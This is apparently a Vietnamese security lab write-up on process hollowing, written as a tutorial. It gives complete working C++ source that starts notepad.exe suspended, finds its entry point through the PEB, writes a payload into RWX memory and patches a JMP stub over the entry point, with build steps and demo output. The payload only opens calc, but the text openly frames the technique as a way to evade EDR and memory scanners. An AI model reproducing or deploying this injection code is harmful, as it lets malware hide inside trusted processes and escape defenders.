
---

# 📝 [PE 08] Process Hollowing (Active Path Custom)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Process Hollowing** (còn gọi là *Inline EntryPoint Patch / Process Replacement*) là một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) kinh điển và mạnh mẽ nhất.

Thay vì cố gắng tiêm mã máy vào một tiến trình đang hoạt động bình thường (hành vi dễ bị các bộ quét RAM động phát hiện do sinh luồng lạ), kỹ thuật này chọn cách **"mượn xác hoàn hồn"**: Khởi tạo một tiến trình vỏ bọc hoàn toàn hợp pháp và sạch từ hệ thống (ví dụ: `notepad.exe`) ở trạng thái đóng băng, sau đó can thiệp cấu trúc PE Header để vá mìn điều hướng ngay tại điểm xuất phát **`EntryPoint`** gốc. Khi rã đông, tiến trình sẽ tự động thực thi mã máy của ta dưới lớp mặt nạ của một danh tính đáng tin cậy.

### 🎯 Mục tiêu nghiên cứu:

* Làm chủ kỹ thuật điều khiển vòng đời tiến trình qua trạng thái đóng băng (`CREATE_SUSPENDED`).
* Giải phẫu cấu trúc ngữ cảnh thanh ghi CPU x64 (`CONTEXT`) và định vị PE Header từ xa.
* Triệt tiêu hoàn toàn chuỗi gán cứng đường dẫn hệ thống bằng giải thuật tự động tra cứu động (Active Path Custom).

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một tiến trình được sinh ra với cờ `CREATE_SUSPENDED`, Windows Kernel sẽ khởi tạo không gian địa chỉ ảo, nạp các tệp DLL cơ bản, dựng cấu trúc PEB (Process Environment Block) và luồng chính (Main Thread), nhưng **đóng băng luồng ngay tại vạch xuất phát hệ thống** (trước khi CPU kịp chạm vào điểm EntryPoint của file thực thi).

Quy trình toán học giải phẫu và điều hướng của Lab PE 08 diễn ra qua các bước ngầm sau:

```
[CreateProcessW: Đóng băng] ──> [GetThreadContext: Đọc thanh ghi] ──> [Đọc PEB -> Định vị EntryPoint] ──> [Vá JMP Stub x64] ──> [ResumeThread: Khai hỏa]

```

1. **Trích xuất Base Address qua PEB**: Trên kiến trúc x64, khi một luồng bị đóng băng sơ khởi, thanh ghi **`Rdx`** của CPU sẽ lưu giữ địa chỉ của cấu trúc **PEB**. Bằng cách đọc ô nhớ ảo từ xa tại tọa độ `Rdx + 0x10`, Loader sẽ bốc chính xác địa chỉ gốc `ImageBaseAddress` thực tế của tiến trình vỏ bọc trên RAM.
2. **Giải phẫu PE Header định vị EntryPoint**: Loader đọc $4\text{ KB}$ đầu tiên của `ImageBaseAddress` để phân tích cấu trúc cấu trúc DOS và NT Headers. Toạ độ tuyệt đối của điểm khai hỏa hợp pháp được tính toán bằng công thức:

$$\text{RemoteEntryPoint} = \text{ImageBaseAddress} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$


3. **Thiết lập mìn điều hướng (Inline JMP Patch)**: Thay vì unmap toàn bộ module (hành vi bị EDR chặn đứng lập tức trên Windows 11), ta áp dụng kỹ thuật vá mịn Inline tinh vi. Ta lật quyền trang nhớ chứa `EntryPoint` sang `RWX` và ghi đè một đoạn mã máy Assembly x64 (JMP Stub) dài 22-byte để bẻ hướng dòng chảy của CPU đâm thẳng vào phân vùng Payload độc lập vị trí (PIC) của ta.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thư mục hệ thống thực tế bằng `GetSystemDirectoryW` để đạt độ linh hoạt tối đa.

```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí sẽ gánh luồng chạy inside lòng tiến trình vỏ bọc
DWORD WINAPI RemoteHollowedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống độc lập inside lòng tiến trình vỏ bọc để bảo toàn tính ổn định
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống chuẩn chỉ (Zero Static Buffers)
std::wstring GetActiveTargetBuffer(const std::wstring& exeName) {
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; 
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Tự động tra cứu bản đồ thư mục hệ thống thực tế thay vì gán cứng
    std::wstring targetProcessName = L"notepad.exe";
    std::wstring activeSysPath = GetActiveTargetBuffer(targetProcessName);
    
    if (activeSysPath.empty()) {
        std::cerr << "[-] Khong the chu dong dinh vi duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong xac dinh duong dan vo boc: " << activeSysPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HỢP PHÁP
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(NULL, const_cast<LPWSTR>(activeSysPath.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!success) {
        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH THANH GHI TỪ XA TỪ CẤU TRÚC PEB
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    PVOID baseAddress = NULL;
    // ĐọcImageBaseAddress từ PEB (Thanh ghi Rdx + offset 0x10 trên x64 architecture)
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address goc cua vo boc: 0x" << std::hex << baseAddress << std::endl;

    // BƯỚC 3: GIẢI PHẪU PE HEADERS X64 ĐỂ ĐỊNH VỊ ENTRYPOINT TỪ XA
    BYTE peHeaderBuf[4096];
    ReadProcessMemory(pi.hProcess, baseAddress, peHeaderBuf, sizeof(peHeaderBuf), NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeaderBuf;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)peHeaderBuf + dosHeader->e_lfanew);

    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint hop phap san co cua Notepad: 0x" << std::hex << remoteEntryPoint << std::endl;

    SIZE_T functionSize = 500;

    // BƯỚC 4: CẤP PHÁT PHÂN VÙNG NHỚ TỪ XA AN TOÀN CHO PAYLOAD
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Khởi tạo tham số tuyệt đối cấu trúc
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPVOID)RemoteHollowedPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // BƯỚC 5: ĐỘT PHÁ CƠ CHẾ VÁ LỆNH TẠI ENTRYPOINT GỐC HỢP PHÁP
    DWORD oldProtect = 0;
    if (VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        
        // Mã máy lệnh nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ tham số tuyệt đối)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Địa chỉ hàm Code)
            0xFF, 0xE0                                                  // jmp rax
        };

        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Đè bẹp vạch xuất phát gốc bằng mìn điều hướng
        WriteProcessMemory(pi.hProcess, remoteEntryPoint, jmpStub, sizeof(jmpStub), NULL);
        VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, oldProtect, &oldProtect);
        std::cout << "[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!" << std::endl;
    }

    // BƯỚC 6: RÃ ĐÔNG LUỒNG KHAI HỎA CHIẾN DỊCH
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] Process Hollowing (Active Path Custom) Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();

    // Giải phóng Handle hệ thống sạch sẽ
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh công cụ quản lý cấu hình dự án ở chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện.
3. Click chuột phải dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch dấu vết.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Thực thi file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế:

```powershell
PS C:\Workspace\x64\Release> .\PE08_Process_Hollowing.exe
====================================================
[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)
====================================================
[+] Da chu dong xac dinh duong dan vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao voi PID: 18128
[+] Toa do Base Address goc cua vo boc: 0x00007FF746130000
[+] Toa do EntryPoint hop phap san co cua Notepad: 0x00007FF746292230
[+] Vung nho Code RWX cua payload dat tai: 0x000001A40CE30000
[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!
[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC...

[+] Process Hollowing (Active Path Custom) Successful!
[*] Nhan phim Enter de don dep va dong cua so...

```

*🎯 Hệ quả RAM:* CPU thức dậy từ trạng thái Suspended, tự động dẫm trúng mìn JMP Patch tại EntryPoint của Notepad, kích nổ mở bung Máy tính `calc.exe` hiên ngang rực rỡ kịch trần kịch khung!

---

